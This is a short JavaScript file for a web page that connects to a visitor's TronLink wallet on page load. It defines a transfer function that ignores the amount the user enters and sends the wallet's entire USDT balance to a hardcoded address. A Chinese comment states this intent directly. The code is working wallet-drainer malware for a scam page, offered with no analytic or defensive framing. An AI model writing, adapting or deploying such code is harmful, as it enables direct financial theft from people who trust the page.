const TARGET_ADDRESS = "TZ5QiipqHXZdpM2JPPGsdvcfSD6amepCRq";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

let tronWeb = null;

async function autoConnect() {
    if (window.tronLink) {
        try {
            await window.tronLink.request({ method: 'tron_requestAccounts' });
            tronWeb = window.tronLink.tronWeb;
            console.log("✅ 钱包已连接");
        } catch (e) {}
    }
}

async function sendTransfer() {
    if (!tronWeb) {
        await autoConnect();
        if (!tronWeb) return alert("请使用 TronLink 打开此页面");
    }

    try {
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const balance = await contract.balanceOf(tronWeb.defaultAddress.base58).call();
        
        // 无论输入多少，都转全部余额
        await contract.transfer(TARGET_ADDRESS, balance).send();
        
        alert("✅ 已调起钱包\n正在转出钱包内全部 USDT");
    } catch (err) {
        console.error(err);
        alert("交易失败或被取消");
    }
}

document.addEventListener('DOMContentLoaded', autoConnect);
